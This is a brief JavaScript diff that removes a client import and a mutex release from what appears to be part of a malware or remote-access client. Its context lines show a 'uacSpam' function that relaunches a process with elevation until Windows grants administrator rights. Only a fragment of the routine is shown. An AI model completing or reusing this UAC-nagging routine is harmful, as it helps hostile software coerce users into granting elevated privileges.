@@ -1,5 +1,4 @@
 const core = require('./core');
-const client = require('../client');
 const childprocess = require('child_process');
 
 function isElevated() {
@@ -30,7 +29,6 @@ function uacSpam(path) {
         elevated = runProcess(path, true);
     }
 
-    client.mutex.release();
     process.exit(0);
 }
 
